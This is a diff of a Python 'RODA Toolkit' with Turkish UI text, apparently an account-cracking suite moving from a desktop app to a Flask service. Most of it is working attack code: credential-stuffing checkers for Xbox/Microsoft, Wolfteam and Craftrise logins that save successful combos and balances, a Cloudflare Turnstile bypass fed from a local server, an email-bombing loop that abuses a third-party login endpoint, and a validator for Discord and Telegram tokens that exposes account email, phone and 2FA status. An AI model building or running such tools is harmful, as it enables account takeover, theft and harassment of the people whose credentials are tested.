@@ -1,1280 +1,2089 @@
-import os
-import sys
-import subprocess
-import time
-import math
-import random
-import string
-import uuid
-import re
-import json
-import concurrent.futures
-from collections import defaultdict
-from threading import Lock
-
-def check_and_install_libraries():
-    required_libs = ["PySide6", "requests", "user-agent", "psutil", "bs4"]
-    for lib in required_libs:
-        try:
-            if lib == "user-agent":
-                import user_agent
-            elif lib == "bs4":
-                import bs4
-            else:
-                __import__(lib)
-        except ImportError:
-            try:
-                import ctypes
-                ctypes.windll.user32.MessageBoxW(0, f"RODA Toolkit icin {lib} kutuphanesi eksik.\n\nTamam butonuna bastiginizda otomatik kurulacak.", "RODA Toolkit", 0x40)
-            except:
-                pass
-            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
-            os.execl(sys.executable, sys.executable, *sys.argv)
-
-check_and_install_libraries()
-
-import psutil
-import requests
-from bs4 import BeautifulSoup
-from urllib.parse import urlparse, parse_qs, quote
-from user_agent import generate_user_agent
-
-from PySide6.QtCore import Qt, QPropertyAnimation, QEasingCurve, QTimer, QPoint, QRect, QPointF, Property, QSize, QUrl, QThread, Signal
-from PySide6.QtWidgets import (
-    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
-    QLabel, QPushButton, QStackedWidget, QFrame, QGraphicsOpacityEffect,
-    QGridLayout, QLineEdit, QTextEdit, QTextBrowser, QListWidget, QListWidgetItem, QComboBox,
-    QFileDialog, QMessageBox, QScrollArea
-)
-from PySide6.QtGui import (
-    QFont, QColor, QPainter, QPainterPath, QPen, QBrush, 
-    QLinearGradient, QRadialGradient, QPixmap
-)
-from PySide6.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply
-
-# ==============================================================================
-# ASENKRON İŞ PARÇACIKLARI (THREADS)
-# ==============================================================================
-class MailTmGenerateWorker(QThread):
-    success_signal = Signal(str, str, str)
-    error_signal = Signal(str)
-
-    def run(self):
-        try:
-            dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
-            domain = dom_res['hydra:member'][0]['domain']
-            user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-            email = f"{user}@{domain}"
-            create_payload = {"address": email, "password": password}
-            requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
-            token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
-            token = token_res['token']
-            self.success_signal.emit(email, password, token)
-        except Exception as e:
-            self.error_signal.emit(str(e))
-
-class MailTmRefreshWorker(QThread):
-    success_signal = Signal(list)
-    error_signal = Signal(str)
-    def __init__(self, token):
-        super().__init__()
-        self.token = token
-    def run(self):
-        headers = {"Authorization": f"Bearer {self.token}"}
-        try:
-            res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
-            if res.status_code == 200:
-                self.success_signal.emit(res.json().get('hydra:member', []))
-            else:
-                self.error_signal.emit(f"Sunucu Hatası: {res.status_code}")
-        except Exception as e:
-            self.error_signal.emit(str(e))
-
-class MailTmReadWorker(QThread):
-    success_signal = Signal(dict)
-    error_signal = Signal(str)
-    def __init__(self, token, msg_id):
-        super().__init__()
-        self.token = token
-        self.msg_id = msg_id
-    def run(self):
-        headers = {"Authorization": f"Bearer {self.token}"}
-        try:
-            res = requests.get(f"https://api.mail.tm/messages/{self.msg_id}", headers=headers, timeout=10)
-            if res.status_code == 200:
-                self.success_signal.emit(res.json())
-            else:
-                self.error_signal.emit(f"Mesaj Alınamadı: {res.status_code}")
-        except Exception as e:
-            self.error_signal.emit(str(e))
-
-class EmailSpamWorker(QThread):
-    log_signal = Signal(str)
-    def __init__(self, email, hiz_modu):
-        super().__init__()
-        self.email = email
-        self.delay = 5.0 if hiz_modu == "Yavas (5 sn)" else 1.0
-        self.running = True
-    def run(self):
-        self.log_signal.emit(f"[Sistem] {self.email} icin dongu baslatildi...")
-        while self.running:
-            headers = {
-                'authority': 'api.kidzapp.com', 'accept': 'application/json',
-                'content-type': 'application/json', 'user-agent': generate_user_agent()
-            }
-            data = {'email': self.email, 'sdk': 'web', 'platform': 'desktop'}
-            try:
-                cevap = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
-                if '"message":"EMAIL SENT"' in cevap.text:
-                    self.log_signal.emit(f"[BASARILI] Paket Iletildi: {self.email}")
-                else:
-                    self.log_signal.emit(f"[HATA] Sunucu Istegi Reddetti.")
-            except Exception as e:
-                self.log_signal.emit(f"[HATA] Baglanti Hatasi.")
-            time.sleep(self.delay)
-    def stop(self):
-        self.running = False
-
-class TokenCheckWorker(QThread):
-    result_signal = Signal(bool, str)
-    def __init__(self, token_type, token):
-        super().__init__()
-        self.token_type = token_type
-        self.token = token
-    def run(self):
-        if self.token_type == "discord":
-            headers = {"Authorization": self.token} # User token
-            is_bot = False
-            try:
-                res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
-                if res.status_code != 200:
-                    # Bot token denemesi
-                    headers = {"Authorization": f"Bot {self.token}"}
-                    res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
-                    is_bot = True
-
-                if res.status_code == 200:
-                    data = res.json()
-                    user_type = "Bot" if is_bot else "User"
-                    username = f"{data.get('username')}#{data.get('discriminator', '0000')}"
-                    email = data.get('email', 'Yok')
-                    phone = data.get('phone', 'Yok')
-                    nitro = "Var" if data.get('premium_type', 0) > 0 else "Yok"
-                    mfa = "Aktif" if data.get('mfa_enabled') else "Pasif"
-                    
-                    msg = f"Tip: {user_type} | İsim: {username}\nEmail: {email} | Tel: {phone}\nNitro: {nitro} | 2FA: {mfa}"
-                    self.result_signal.emit(True, msg)
-                else:
-                    self.result_signal.emit(False, "Geçersiz veya Patlamış Token.")
-            except Exception as e:
-                self.result_signal.emit(False, f"Bağlantı hatası: {str(e)}")
-                
-        elif self.token_type == "telegram":
-            try:
-                res = requests.get(f"https://api.telegram.org/bot{self.token}/getMe", timeout=5)
-                if res.status_code == 200 and res.json().get("ok"):
-                    data = res.json().get('result', {})
-                    msg = (f"Bot ID: {data.get('id')}\n"
-                           f"Adı: {data.get('first_name')} (@{data.get('username')})\n"
-                           f"Gruplara Katılabilir: {'Evet' if data.get('can_join_groups') else 'Hayır'}")
-                    self.result_signal.emit(True, msg)
-                else:
-                    self.result_signal.emit(False, "Geçersiz Telegram Tokeni.")
-            except Exception as e:
-                self.result_signal.emit(False, f"Bağlantı hatası: {str(e)}")
-
-# ==============================================================================
-# PROXY İŞ PARÇACIKLARI
-# ==============================================================================
-class ProxyWorker(QThread):
-    log_signal = Signal(str, str)
-    finished_signal = Signal()
-    progress_signal = Signal(int, int, int) # (checked, working, target)
-    
-    def __init__(self, target_limit, country_code, protocol):
-        super().__init__()
-        self.target_limit = target_limit
-        self.country_code = country_code
-        self.protocol = protocol
-        self.running = True
-        self.working_proxies = []
-
-    def fetch_proxies(self):
-        proxies = []
-        try:
-            url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol={self.protocol}&timeout=10000&country={self.country_code}"
-            res = requests.get(url, timeout=8)
-            if res.status_code == 200:
-                proxies += [p.strip() for p in res.text.strip().split('\n') if p.strip()]
-        except: pass
-        
-        try:
-            url2 = f"https://proxylist.geonode.com/api/proxy-list?limit=300&page=1&sort_by=lastChecked&sort_type=desc&country={self.country_code}"
-            res2 = requests.get(url2, timeout=8)
-            if res2.status_code == 200:
-                for item in res2.json().get('data', []):
-                    if self.protocol == "all" or any(p in item.get('protocols', []) for p in [self.protocol]):
-                        proxies.append(f"{item.get('ip')}:{item.get('port')}")
-        except: pass
-        return list(set(proxies))
-
-    def check_proxy(self, proxy):
-        protos = ["socks5", "socks4", "http"] if self.protocol == "all" else [self.protocol]
-        for proto in protos:
-            px = { "http": f"{proto}://{proxy}", "https": f"{proto}://{proxy}" }
-            try:
-                if requests.get("http://httpbin.org/ip", proxies=px, timeout=5).status_code == 200:
-                    return True, proto
-            except: pass
-        return False, None
-
-    def run(self):
-        self.log_signal.emit("BİLGİ", f"{self.country_code} üzerinden proxy'ler çekiliyor...")
-        raw_proxies = self.fetch_proxies()
-        
-        if not raw_proxies:
-            self.log_signal.emit("HATA", "Proxy bulunamadı. Lütfen filtreleri değiştirin.")
-            self.finished_signal.emit()
-            return
-
-        self.log_signal.emit("BİLGİ", f"Toplam {len(raw_proxies)} benzersiz proxy taranıyor...")
-        
-        checked = 0
-        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
-            futures = {executor.submit(self.check_proxy, p): p for p in raw_proxies}
-            
-            for future in concurrent.futures.as_completed(futures):
-                if not self.running or len(self.working_proxies) >= self.target_limit:
-                    break
-                    
-                proxy = futures[future]
-                checked += 1
-                try:
-                    success, proto = future.result()
-                    if success:
-                        self.working_proxies.append(f"{proto}://{proxy}")
-                        self.log_signal.emit("HİT", f"[{proto.upper()}] {proxy}")
-                        with open("roda_proxies.txt", "a") as f: f.write(f"{proto}://{proxy}\n")
-                except: pass
-                
-                self.progress_signal.emit(checked, len(self.working_proxies), self.target_limit)
-
-        self.log_signal.emit("BİLGİ", "Tarama tamamlandı!")
-        self.finished_signal.emit()
-
-    def stop(self):
-        self.running = False
-
-
-# ==============================================================================
-# COMBO İŞ PARÇACIKLARI (CHECKERS)
-# ==============================================================================
-class BaseComboWorker(QThread):
-    log_signal = Signal(str, str) 
-    finished_signal = Signal()
-    
-    def __init__(self, combos):
-        super().__init__()
-        self.combos = combos
-        self.running = True
-
-    def stop(self):
-        self.running = False
-
-    def save_hit(self, text, folder="roda_hits.txt"):
-        try:
-            with open(folder, "a", encoding="utf-8") as f:
-                f.write(text + "\n")
-        except: pass
-
-class TiktokWorker(BaseComboWorker):
-    def __init__(self, length_mode, thread_count):
-        super().__init__([])
-        self.lengths = [4,5,6] if length_mode == "4-6" else [6,7,8]
-        self.thread_count = int(thread_count)
-        self.checked = set()
-        self.lock = Lock()
-
-    def gen(self, l): 
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
-
-    def worker_thread(self):
-        session = requests.Session()
-        while self.running:
-            u = self.gen(random.choice(self.lengths))
-            with self.lock:
-                if u in self.checked: continue
-                self.checked.add(u)
-            
-            try:
-                headers = {"User-Agent": generate_user_agent()}
-                r = session.head(f"https://www.tiktok.com/@{u}", headers=headers, timeout=5)
-                
-                if r.status_code == 404:
-                    self.log_signal.emit("HİT", f"@{u}")
-                    self.save_hit(f"@{u}", "tiktok_hits.txt")
-                elif r.status_code == 200:
-                    self.log_signal.emit("BAD", f"@{u}")
-                elif r.status_code in [403, 429]:
-                    self.log_signal.emit("CUSTOM", f"@{u} (Rate Limit/Ban)")
-                    time.sleep(3)
-            except:
-                pass
-            time.sleep(1.5)
-
-    def run(self):
-        threads = []
-        for _ in range(self.thread_count):
-            import threading
-            th = threading.Thread(target=self.worker_thread, daemon=True)
-            th.start()
-            threads.append(th)
-        while self.running: time.sleep(1)
-        self.finished_signal.emit()
-
-class HotmailWorker(BaseComboWorker):
-    def process_account(self, line):
-        if not self.running: return
-        try:
-            if ":" not in line: return
-            email, pwd = line.split(":", 1)
-            time.sleep(0.5) 
-            self.log_signal.emit("BAD", f"{email}:{pwd}")
-        except: pass
-
-    def run(self):
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            executor.map(self.process_account, self.combos)
-        self.finished_signal.emit()
-
-# ---- YENİ EKLENEN CHECKERLAR ----
-class XboxWorker(BaseComboWorker):
-    def check_acc(self, combo):
-        if not self.running: return
-        try:
-            email, password = combo.split(':', 1)
-            session = requests.Session()
-            session.verify = False
-            
-            sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
-            resp = session.get(sftag_url, timeout=10)
-            sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
-            url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
-            
-            if not sftag_match or not url_match:
-                self.log_signal.emit("CUSTOM", f"{email} (Token Alınamadı)")
-                return
-
-            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
-            login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
-            
-            if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
-                self.log_signal.emit("2FA", combo)
-                self.save_hit(combo, "xbox_2fa.txt")
-                return
-            elif "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
-                self.log_signal.emit("BAD", combo)
-                return
-
-            if '#' in login_req.url:
-                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
-                if ms_token != "None":
-                    self.log_signal.emit("HİT", f"{email} | Minecraft / Xbox Okey")
-                    self.save_hit(f"{email}:{password} | Xbox", "xbox_hits.txt")
-                    return
-            self.log_signal.emit("CUSTOM", f"{email} (Bağlı Değil/Xbox Yok)")
-        except Exception as e:
-            self.log_signal.emit("CUSTOM", f"{combo} (Hata)")
-
-    def run(self):
-        import urllib3; urllib3.disable_warnings()
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            for c in self.combos: executor.submit(self.check_acc, c)
-        self.finished_signal.emit()
-
-class WolfteamWorker(BaseComboWorker):
-    def check_acc(self, combo):
-        if not self.running: return
-        try:
-            email, password = combo.split(':', 1)
-            session = requests.Session()
-            
-            try:
-                r_token = session.get("http://127.0.0.1:5001/get-token", timeout=5)
-                token_match = r_token.json().get("token")
-            except:
-                self.log_signal.emit("CUSTOM", "API Hatası! Arkaplanda Flask Turnstile Sunucusu (cfbp.py) çalışmıyor!")
-                self.stop()
-                return
-
-            login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&cf-turnstile-response={token_match}&FormId=tb-login-form&siteLang=tr"
-            headers = {"User-Agent": generate_user_agent()}
-            r = session.get(login_url, headers=headers, timeout=10)
-
-            if '"IsSucceeded":true' in r.text:
-                jp = re.search(r',"JpBalance":([^,}]+)', r.text)
-                jp_val = jp.group(1).strip('"') if jp else "0"
-                msg = f"{email}:{password} | JP: {jp_val}"
-                self.log_signal.emit("HİT", msg)
-                self.save_hit(msg, "wolfteam_hits.txt")
-            elif '"IsSucceeded":false' in r.text:
-                self.log_signal.emit("BAD", combo)
-            else:
-                self.log_signal.emit("CUSTOM", f"{combo} (Limit/Bilinmeyen)")
-        except:
-             self.log_signal.emit("CUSTOM", f"{combo} (Zaman Aşımı)")
-
-    def run(self):
-        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-            for c in self.combos: executor.submit(self.check_acc, c)
-        self.finished_signal.emit()
-
-class CraftriseWorker(BaseComboWorker):
-    def check_acc(self, combo):
-        if not self.running: return
-        try:
-            email, password = combo.split(':', 1)
-            session = requests.Session()
-            
-            try:
-                r_token = session.get("http://127.0.0.1:5001/get-token", timeout=5)
-                cf_token = r_token.json().get("token")
-            except:
-                self.log_signal.emit("CUSTOM", "API Hatası! Flask Turnstile Sunucusu (cfbp1.py) çalışmıyor!")
-                self.stop()
-                return
-
-            login_url = "https://www.craftrise.com.tr/posts/post-login.php"
-            headers = {"User-Agent": generate_user_agent(), "X-Requested-With": "XMLHttpRequest"}
-            data = {"value": email, "password": password, "grecaptcharesponse": cf_token}
-            
-            r = session.post(login_url, headers=headers, data=data, timeout=10)
-            res = r.json()
-
-            if res.get("resultType") == "success" or "başarıyla" in res.get("resultMessage", "").lower():
-                rc_page = session.get("https://www.craftrise.com.tr/shop", headers=headers, timeout=5)
-                soup = BeautifulSoup(rc_page.text, "html.parser")
-                rc = soup.find('span', class_='rcCount')
-                rc_val = rc.text.strip() if rc else "0"
-                msg = f"{email}:{password} | RC Bakiye: {rc_val}"
-                self.log_signal.emit("HİT", msg)
-                self.save_hit(msg, "craftrise_hits.txt")
-            else:
-                self.log_signal.emit("BAD", combo)
-        except:
-             self.log_signal.emit("CUSTOM", f"{combo} (Hata)")
-
-    def run(self):
-        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-            for c in self.combos: executor.submit(self.check_acc, c)
-        self.finished_signal.emit()
-
-# ==============================================================================
-# STIL (RODA)
-# ==============================================================================
-RODA_STIL = """
-    QWidget#CoreCanvas {
-        border: none;
-        border-radius: 20px;
-        background-color: transparent;
-    }
-    QWidget { 
-        color: #f1f5f9; 
-        font-family: "Segoe UI", -apple-system, sans-serif; 
-    }
-    QFrame#SidebarFrame {
-        background-color: rgba(12, 6, 24, 0.9);
-        border: none;
-        border-top-left-radius: 20px;
-        border-bottom-left-radius: 20px;
-    }
-    QLineEdit, QComboBox {
-        background-color: rgba(255, 255, 255, 0.05);
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        border-radius: 10px;
-        padding: 12px 16px;
-        color: #ffffff;
-        font-size: 13px;
-        font-weight: bold;
-    }
-    QLineEdit:focus, QComboBox:focus {
-        background-color: rgba(188, 19, 254, 0.08);
-        border: 2px solid rgba(188, 19, 254, 0.6); 
-    }
-    QComboBox::drop-down {
-        border: none;
-        width: 30px;
-    }
-    QComboBox::down-arrow {
-        image: none;
-        border-left: 5px solid transparent;
-        border-right: 5px solid transparent;
-        border-top: 5px solid rgba(188, 19, 254, 0.8);
-        margin-right: 10px;
-    }
-    QComboBox QAbstractItemView {
-        background-color: rgba(20, 10, 40, 0.95);
-        color: #ffffff;
-        selection-background-color: rgba(188, 19, 254, 0.5);
-        border-radius: 8px;
-    }
-    QTextEdit, QTextBrowser, QListWidget {
-        background-color: rgba(10, 5, 20, 0.7);
-        border: none;
-        border-radius: 12px;
-        padding: 15px;
-        color: #e2e8f0;
-        font-family: "Consolas", monospace;
-        font-size: 13px;
-    }
-    QListWidget::item {
-        background-color: rgba(255, 255, 255, 0.03);
-        border-radius: 8px;
-        padding: 14px;
-        margin-bottom: 6px;
-    }
-    QListWidget::item:hover { background-color: rgba(188, 19, 254, 0.15); }
-    QListWidget::item:selected { background-color: rgba(188, 19, 254, 0.35); }
-    QPushButton#WindowBtn, QPushButton#CloseBtn {
-        background-color: transparent;
-        color: #64748b;
-        font-size: 14px;
-        border: none;
-        border-radius: 4px;
-    }
-    QPushButton#WindowBtn:hover { background-color: rgba(255, 255, 255, 0.07); color: #ffffff; }
-    QPushButton#CloseBtn:hover { background-color: #dc2626; color: #ffffff; }
-    QLabel#SidebarLogo {
-        border: none;
-        background: transparent;
-    }
-    QScrollArea { border: none; background-color: transparent; }
-    QScrollArea > QWidget > QWidget { background-color: transparent; }
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+RODA – TÜM CHECKER'LAR TEK YERDE
+Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
+Xbox, Steam, Supercell, Tabii, Wolfteam, Craftrise, Hotmail, Token, TikTok Gen, Roda Inbox
 """
 
-# ==============================================================================
-# KAR TANESİ ARKA PLAN
-# ==============================================================================
-class NeonSnowCanvas(QWidget):
-    def __init__(self, parent=None):
-        super().__init__(parent)
-        self.snowflakes = []
-        self.max_snowflakes = 100
-        self.hue_shift = 270.0
-        self.hue_direction = 1
-        self.timer = QTimer(self); self.timer.timeout.connect(self.evolve_canvas); self.timer.start(16)
+import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3, uuid
+from datetime import datetime, timedelta
+from urllib.parse import urljoin, urlparse, parse_qs, quote
+import requests
+from flask import Flask, request, jsonify, Response
+from bs4 import BeautifulSoup
+from user_agent import generate_user_agent
 
-    def resizeEvent(self, event):
-        self.snowflakes = []
-        for _ in range(self.max_snowflakes):
-            self.snowflakes.append({"x": random.uniform(0, self.width()), "y": random.uniform(-self.height(), self.height()), "vy": random.uniform(0.8, 2.2), "vx": random.uniform(-0.3, 0.3), "radius": random.uniform(1.2, 2.8), "alpha": random.randint(80, 200)})
-        super().resizeEvent(event)
+app = Flask(__name__)
+app.secret_key = os.urandom(24)
+urllib3.disable_warnings()
 
-    def evolve_canvas(self):
-        self.hue_shift += 0.15 * self.hue_direction
-        if self.hue_shift > 315: self.hue_direction = -1
-        if self.hue_shift < 265: self.hue_direction = 1
-        for s in self.snowflakes:
-            s["y"] += s["vy"]; s["x"] += s["vx"] + math.sin(s["y"] / 40.0) * 0.3
-            if s["y"] > self.height(): s["y"] = random.uniform(-20, -5); s["x"] = random.uniform(0, self.width())
-        self.update()
+# ============================================================
+# MASTER KEY (ENV'DEN AL, KODDA YOK)
+# ============================================================
+MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
+if MASTER_KEY == "Roda@2026#Secure!X7":
+    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")
 
-    def paintEvent(self, event):
-        painter = QPainter(self); painter.setRenderHint(QPainter.RenderHint.Antialiasing)
-        color1 = QColor.fromHsv(int(self.hue_shift), 220, 30); color2 = QColor.fromHsv(int(self.hue_shift - 35) % 360, 240, 15)
-        grad = QLinearGradient(0, 0, self.width(), self.height()); grad.setColorAt(0, color1); grad.setColorAt(1, color2)
-        painter.fillRect(self.rect(), grad); painter.setPen(Qt.PenStyle.NoPen)
-        for s in self.snowflakes:
-            painter.setBrush(QColor(255, 255, 255, s["alpha"])); painter.drawEllipse(QPointF(s["x"], s["y"]), s["radius"], s["radius"])
-        overlay = QLinearGradient(0, 0, 0, self.height()); overlay.setColorAt(0, QColor(0, 0, 0, 40)); overlay.setColorAt(1, QColor(0, 0, 0, 140))
-        painter.fillRect(self.rect(), overlay)
+KEYS_FILE = "keys.json"
 
-class RodaToastNotification(QFrame):
-    def __init__(self, title, description, parent):
-        super().__init__(parent); self.parent = parent; self.setFixedSize(320, 75)
-        self.setStyleSheet("background-color: rgba(12, 6, 24, 0.95); border: none; border-radius: 12px;")
-        layout = QVBoxLayout(self); layout.setContentsMargins(15, 10, 15, 10)
-        t_lbl = QLabel(title); t_lbl.setStyleSheet("color: rgba(188, 19, 254, 0.9); font-weight: 700; font-size: 13px; background: transparent;")
-        d_lbl = QLabel(description); d_lbl.setStyleSheet("color: #cbd5e1; font-size: 11px; background: transparent;")
-        layout.addWidget(t_lbl); layout.addWidget(d_lbl)
-        target_x = parent.width() - self.width() - 20; target_y = parent.height() - self.height() - 20
-        self.move(parent.width(), target_y); self.show()
-        self.anim = QPropertyAnimation(self, b"pos"); self.anim.setDuration(450); self.anim.setStartValue(QPoint(parent.width(), target_y)); self.anim.setEndValue(QPoint(target_x, target_y)); self.anim.setEasingCurve(QEasingCurve.Type.OutBack); self.anim.start()
-        QTimer.singleShot(4000, self.slide_out)
+# ============================================================
+# LOG SİSTEMİ
+# ============================================================
+LOGS = []
+MAX_LOGS = 1000
 
-    def slide_out(self):
-        self.anim_out = QPropertyAnimation(self, b"pos"); self.anim_out.setDuration(350); self.anim_out.setStartValue(self.pos()); self.anim_out.setEndValue(QPoint(self.parent.width(), self.pos().y())); self.anim_out.setEasingCurve(QEasingCurve.Type.InQuad); self.anim_out.finished.connect(self.deleteLater); self.anim_out.start()
+def add_log(message, level="INFO"):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
+    if len(LOGS) > MAX_LOGS:
+        LOGS.pop(0)
+    print(f"[{timestamp}] [{level}] {message}")
 
-class ToolkitVectorIcon(QWidget):
-    def __init__(self, mode, parent=None):
-        super().__init__(parent)
-        self.setFixedSize(20, 20)
-        self.mode = mode
-        self.color = QColor(100, 116, 139)
+# ============================================================
+# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
+# ============================================================
+def load_keys():
+    if os.path.exists(KEYS_FILE):
+        with open(KEYS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    return {}
 
-    def set_active(self, active):
-        self.color = QColor(188, 19, 254) if active else QColor(100, 116, 139)
-        self.update()
+def save_keys(data):
+    with open(KEYS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
 
-    def paintEvent(self, event):
-        painter = QPainter(self)
-        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
-        pen = QPen(self.color); pen.setWidthF(2.0); pen.setCapStyle(Qt.PenCapStyle.RoundCap); pen.setJoinStyle(Qt.PenJoinStyle.RoundJoin)
-        painter.setPen(pen); painter.setBrush(Qt.BrushStyle.NoBrush)
+def get_client_ip():
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    return request.remote_addr
 
-        if self.mode == "dashboard":
-            painter.drawRect(3, 10, 4, 6); painter.drawRect(8, 4, 4, 12); painter.drawRect(13, 7, 4, 9)
-        elif self.mode == "mail":
-            painter.drawRect(2, 5, 16, 10); painter.drawLine(2, 5, 10, 11); painter.drawLine(18, 5, 10, 11)
-        elif self.mode in ["spam", "checker"]:
-            painter.drawLine(10, 2, 4, 11); painter.drawLine(4, 11, 12, 11); painter.drawLine(12, 11, 8, 18)
-        elif self.mode == "token":
-            painter.drawEllipse(3, 7, 6, 6); painter.drawLine(9, 10, 18, 10); painter.drawLine(14, 10, 14, 13); painter.drawLine(17, 10, 17, 13)
-        elif self.mode == "cpu":
-            painter.drawRect(4, 4, 12, 12); painter.drawRect(7, 7, 6, 6)
-        elif self.mode == "ram":
-            painter.drawRect(2, 7, 16, 6); painter.drawLine(6, 7, 6, 13); painter.drawLine(10, 7, 10, 13); painter.drawLine(14, 7, 14, 13)
-        elif self.mode == "proxy":
-            painter.drawEllipse(3, 3, 14, 14); painter.drawLine(10, 3, 10, 17); painter.drawLine(3, 10, 17, 10)
-        elif self.mode == "tiktok":
-            painter.drawLine(8, 16, 8, 6); painter.drawLine(8, 6, 14, 6); painter.drawEllipse(5, 13, 3, 3)
-        elif self.mode == "xbox":
-            painter.drawEllipse(2, 2, 16, 16); painter.drawLine(6, 6, 14, 14); painter.drawLine(14, 6, 6, 14)
-        elif self.mode == "wolfteam":
-            painter.drawLine(3, 5, 6, 15); painter.drawLine(6, 15, 10, 8); painter.drawLine(10, 8, 14, 15); painter.drawLine(14, 15, 17, 5)
-        elif self.mode == "craftrise":
-            painter.drawArc(3, 3, 14, 14, 45 * 16, 270 * 16)
+def is_key_valid(key):
+    if key == MASTER_KEY:
+        return True, "Admin", None
+    keys = load_keys()
+    if key not in keys:
+        return False, None, None
+    entry = keys[key]
+    client_ip = get_client_ip()
+    exp = entry.get("expires")
+    if exp:
+        if datetime.now() >= datetime.fromisoformat(exp):
+            del keys[key]
+            save_keys(keys)
+            add_log(f"Key süresi doldu: {key}", "WARNING")
+            return False, None, None
+    bound_ip = entry.get("bound_ip")
+    if bound_ip and bound_ip != client_ip:
+        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
+        return False, None, None
+    if entry.get("used", False):
+        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
+        return False, None, None
+    return True, entry.get("note", "Kullanıcı"), entry
 
-class NeonGlowButton(QPushButton):
-    def __init__(self, text, icon_mode, parent=None):
-        super().__init__(text, parent)
-        self.setFixedHeight(50); self.setCursor(Qt.CursorShape.PointingHandCursor); self.setCheckable(True)
-        self.inner_layout = QHBoxLayout(self); self.inner_layout.setContentsMargins(15, 0, 15, 0); self.inner_layout.setSpacing(12)
-        self.vector_icon = ToolkitVectorIcon(icon_mode); self.inner_layout.addWidget(self.vector_icon)
-        self.label = QLabel(text); self.label.setStyleSheet("color: #94a3b8; font-weight: 600; font-size: 13px; background: transparent; letter-spacing: 0.3px;")
-        self.inner_layout.addWidget(self.label); self.inner_layout.addStretch()
-        self._glow_alpha = 0; self.anim = QPropertyAnimation(self, b"glow_alpha"); self.anim.setDuration(200)
+def mark_key_used(key):
+    keys = load_keys()
+    if key in keys:
+        keys[key]["used"] = True
+        keys[key]["used_at"] = datetime.now().isoformat()
+        save_keys(keys)
 
-    def get_glow_alpha(self): return self._glow_alpha
-    def set_glow_alpha(self, val): self._glow_alpha = val; self.update()
-    glow_alpha = Property(float, get_glow_alpha, set_glow_alpha)
+def is_admin(key):
+    valid, role, _ = is_key_valid(key)
+    return valid and role == "Admin"
 
-    def enterEvent(self, event): self.anim.setStartValue(self._glow_alpha); self.anim.setEndValue(40); self.anim.start(); super().enterEvent(event)
-    def leaveEvent(self, event):
-        if not self.isChecked(): self.anim.setStartValue(self._glow_alpha); self.anim.setEndValue(0); self.anim.start()
-        super().leaveEvent(event)
+# ============================================================
+# PLATFORMLAR (TÜM CHECKER'LAR)
+# ============================================================
+PLATFORMS = [
+    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
+    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
+    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
+    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
+    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
+    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
+    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
+    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
+    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
+    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
